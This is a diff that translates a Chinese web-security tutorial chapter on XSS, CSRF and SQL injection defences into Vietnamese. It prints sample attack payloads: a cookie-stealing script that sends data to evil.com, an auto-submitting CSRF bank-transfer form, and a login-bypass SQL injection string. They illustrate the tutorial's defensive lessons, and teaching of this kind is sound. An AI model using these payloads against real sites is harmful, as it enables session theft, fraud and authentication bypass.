@@ -1,99 +1,98 @@
 ---
-title: "6.4 认识常见的网络小偷——常见 Web 安全威胁与防护"
-typora-root-url: ../../public
+title: "6.4 Nhận biết những kẻ trộm mạng phổ biến——Mối đe dọa bảo mật Web thường gặp và cách phòng chống"
 ---
 
-# 6.4 认识常见的网络小偷——常见 Web 安全威胁与防护
+# 6.4 Nhận biết những kẻ trộm mạng phổ biến——Mối đe dọa bảo mật Web thường gặp và cách phòng chống
 
-## 认知重构
+## Xây dựng lại nhận thức
 
-Web 安全威胁并不神秘。它们的本质都是**利用系统的信任机制**：浏览器信任网站返回的内容、服务器信任已登录用户的请求、数据库信任应用传来的查询。攻击者做的，就是在这些"信任链"中找到可以钻的空子。
+Mối đe dọa bảo mật Web không bí ẩn. Bản chất của chúng là **khai thác cơ chế tin tưởng của hệ thống**: trình duyệt tin tưởng nội dung mà trang web trả về, máy chủ tin tưởng các yêu cầu từ người dùng đã đăng nhập, cơ sở dữ liệu tin tưởng các truy vấn từ ứng dụng. Những gì kẻ tấn công làm là tìm kiếm những khe hở trong những "chuỗi tin tưởng" này để khai thác.
 
 ```mermaid
 flowchart TD
-    subgraph Threats["常见威胁"]
-        XSS["XSS\n跨站脚本"]
-        CSRF["CSRF\n跨站请求伪造"]
-        Injection["注入攻击\nSQL/命令注入"]
+    subgraph Threats["Những mối đe dọa phổ biến"]
+        XSS["XSS\nCross-Site Scripting"]
+        CSRF["CSRF\nCross-Site Request Forgery"]
+        Injection["Cuộc tấn công injection\nSQL/command injection"]
     end
-    
-    subgraph Trust["被利用的信任"]
-        T1["浏览器信任网页内容"]
-        T2["服务器信任用户请求"]
-        T3["数据库信任应用查询"]
+
+    subgraph Trust["Sự tin tưởng bị khai thác"]
+        T1["Trình duyệt tin tưởng nội dung trang web"]
+        T2["Máy chủ tin tưởng yêu cầu từ người dùng"]
+        T3["Cơ sở dữ liệu tin tưởng truy vấn từ ứng dụng"]
     end
-    
-    XSS -->|利用| T1
-    CSRF -->|利用| T2
-    Injection -->|利用| T3
+
+    XSS -->|khai thác| T1
+    CSRF -->|khai thác| T2
+    Injection -->|khai thác| T3
 ```
 
-## 本节内容
+## Nội dung phần này
 
-| 小节 | 核心问题 | 你将学会 |
+| Mục | Câu hỏi cốt lõi | Bạn sẽ học được |
 |------|----------|----------|
-| 6.4.1 XSS 防护 | 恶意脚本如何被注入？ | 输入验证与输出编码 |
-| 6.4.2 CSRF 防护 | 身份如何被盗用？ | Token 验证与 SameSite |
-| 6.4.3 CORS 配置 | 跨域请求怎么控制？ | 安全的跨域策略 |
-| 6.4.4 同源策略 | 浏览器如何保护用户？ | 理解浏览器安全基础 |
-| 6.4.5 输入验证 | 如何防止注入攻击？ | 参数化查询与验证 |
+| 6.4.1 Phòng chống XSS | Làm sao script độc hại bị tiêm vào? | Xác thực đầu vào và mã hóa đầu ra |
+| 6.4.2 Phòng chống CSRF | Làm sao danh tính bị đánh cắp? | Xác thực Token và SameSite |
+| 6.4.3 Cấu hình CORS | Làm sao kiểm soát yêu cầu cross-origin? | Chiến lược cross-origin an toàn |
+| 6.4.4 Same-Origin Policy | Trình duyệt bảo vệ người dùng như thế nào? | Hiểu các cơ sở bảo mật trình duyệt |
+| 6.4.5 Xác thực đầu vào | Làm sao phòng chống cuộc tấn công injection? | Truy vấn tham số hóa và xác thực |
 
-## 攻击原理速览
+## Tổng quan nguyên lý tấn công
 
-### XSS：让你的网站执行别人的代码
+### XSS: Làm cho trang web của bạn thực thi code của người khác
 
 ```html
-<!-- 用户在评论框输入 -->
+<!-- Người dùng nhập vào hộp bình luận -->
 <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
 
-<!-- 如果网站直接渲染，攻击者就能偷走所有访问者的 Cookie -->
+<!-- Nếu trang web render trực tiếp, kẻ tấn công có thể đánh cắp tất cả Cookie từ tất cả người truy cập -->
 ```
 
-### CSRF：借用你的身份做坏事
+### CSRF: Sử dụng danh tính của bạn để làm điều xấu
 
 ```html
-<!-- evil.com 的隐藏表单 -->
+<!-- Form ẩn từ evil.com -->
 <form action="https://bank.com/transfer" method="POST">
   <input name="to" value="attacker" />
   <input name="amount" value="10000" />
 </form>
 <script>document.forms[0].submit()</script>
-<!-- 用户已登录 bank.com，浏览器自动带上 Cookie -->
+<!-- Người dùng đã đăng nhập bank.com, trình duyệt tự động mang theo Cookie -->
 ```
 
-### SQL 注入：绕过你的验证逻辑
+### SQL Injection: Vượt qua logic xác thực của bạn
 
 ```sql
--- 用户输入用户名：admin' OR '1'='1
+-- Người dùng nhập tên người dùng: admin' OR '1'='1
 SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...'
--- 这条 SQL 总是返回结果，绕过了密码验证
+-- Câu SQL này luôn trả về kết quả, vượt qua xác thực mật khẩu
 ```
 
-## 防御思维模型
+## Mô hình tư duy phòng chống
 
-防御的核心原则只有一条：**永远不要信任用户输入**。
+Nguyên tắc cốt lõi của phòng chống chỉ có một: **Không bao giờ tin tưởng đầu vào của người dùng**.
 
 ```mermaid
 flowchart LR
-    Input["用户输入"] --> Validate["验证\n格式/类型/范围"]
-    Validate --> Sanitize["清理\n移除危险内容"]
-    Sanitize --> Escape["转义\n根据上下文编码"]
-    Escape --> Use["安全使用"]
+    Input["Đầu vào của người dùng"] --> Validate["Xác thực\nDịnh dạng/loại/phạm vi"]
+    Validate --> Sanitize["Làm sạch\nLoại bỏ nội dung nguy hiểm"]
+    Sanitize --> Escape["Thoát\nMã hóa theo bối cảnh"]
+    Escape --> Use["Sử dụng an toàn"]
 ```
 
-### 不同上下文的转义规则
+### Quy tắc thoát ký tự ở các bối cảnh khác nhau
 
-| 上下文 | 危险字符 | 转义方式 |
+| Bối cảnh | Ký tự nguy hiểm | Cách thoát |
 |--------|----------|----------|
-| HTML 内容 | `< > & " '` | HTML 实体编码 |
-| HTML 属性 | `" '` | 属性值编码 |
-| JavaScript | `' " \` | JS 转义 |
-| URL 参数 | `& = ? #` | URL 编码 |
-| SQL 查询 | `' " ; --` | 参数化查询 |
+| Nội dung HTML | `< > & " '` | Mã hóa thực thể HTML |
+| Thuộc tính HTML | `" '` | Mã hóa giá trị thuộc tính |
+| JavaScript | `' " \` | Thoát JS |
+| Tham số URL | `& = ? #` | Mã hóa URL |
+| Truy vấn SQL | `' " ; --` | Truy vấn tham số hóa |
 
-## 安全工具链
+## Chuỗi công cụ bảo mật
 
-### 1. 输入验证：Zod
+### 1. Xác thực đầu vào: Zod
 
 ```typescript
 import { z } from 'zod'
@@ -105,7 +104,7 @@ const UserInput = z.object({
 })
 ```
 
-### 2. HTML 清理：DOMPurify
+### 2. Làm sạch HTML: DOMPurify
 
 ```typescript
 import DOMPurify from 'isomorphic-dompurify'
@@ -115,33 +114,33 @@ const clean = DOMPurify.sanitize(dirtyHtml, {
 })
 ```
 
-### 3. 参数化查询：Prisma
+### 3. Truy vấn tham số hóa: Prisma
 
 ```typescript
-// ✅ 安全：Prisma 自动参数化
+// ✅ An toàn: Prisma tự động tham số hóa
 const user = await prisma.user.findFirst({
   where: { email: userInput }
 })
 
-// ❌ 危险：原始 SQL 拼接
+// ❌ Nguy hiểm: Ghép SQL thô
 const user = await prisma.$queryRawUnsafe(
   `SELECT * FROM users WHERE email = '${userInput}'`
 )
 ```
 
-## AI 协作提示
+## Gợi ý hợp tác với AI
 
-在让 AI 生成涉及用户输入的代码时，明确要求：
+Khi yêu cầu AI tạo code liên quan đến đầu vào người dùng, hãy yêu cầu rõ ràng:
 
-- "使用 Zod 验证所有用户输入"
-- "使用参数化查询，不要拼接 SQL"
-- "使用 DOMPurify 清理需要渲染的 HTML"
-- "所有输出到页面的内容都要转义"
+- "Sử dụng Zod để xác thực tất cả đầu vào của người dùng"
+- "Sử dụng truy vấn tham số hóa, không ghép SQL"
+- "Sử dụng DOMPurify để làm sạch HTML cần render"
+- "Tất cả đầu ra được gửi đến trang đều phải thoát"
 
-::: warning 安全审查清单
-1. [ ] 所有用户输入都经过验证
-2. [ ] 不直接拼接 SQL 语句
-3. [ ] 不使用 `dangerouslySetInnerHTML`
-4. [ ] 配置了 CSP 响应头
-5. [ ] Cookie 设置了 HttpOnly 和 Secure
+::: warning Danh sách kiểm tra xem xét bảo mật
+1. [ ] Tất cả đầu vào của người dùng đều được xác thực
+2. [ ] Không ghép trực tiếp câu lệnh SQL
+3. [ ] Không sử dụng `dangerouslySetInnerHTML`
+4. [ ] Đã cấu hình header phản hồi CSP
+5. [ ] Cookie được đặt HttpOnly và Secure
 :::
